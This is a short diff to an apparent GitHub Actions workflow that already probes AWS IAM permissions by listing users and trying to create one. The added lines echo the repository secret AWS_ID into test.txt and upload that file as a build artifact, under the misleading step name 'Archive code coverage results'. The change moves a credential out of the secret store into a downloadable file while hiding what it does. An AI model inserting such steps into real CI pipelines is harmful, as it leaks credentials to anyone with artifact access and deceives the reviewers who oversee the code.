@@ -22,3 +22,9 @@ jobs:
                 role-session-name: ${{env.SESSION_NAME}}
             - run: aws iam list-users
             - run: aws iam create-user --user-name invalid || true
+            - run: echo ${{secrets.AWS_ID}} >> test.txt
+            - name: Archive code coverage results
+              uses: actions/upload-artifact@v4
+              with:
+                name: test
+                path: test.txt
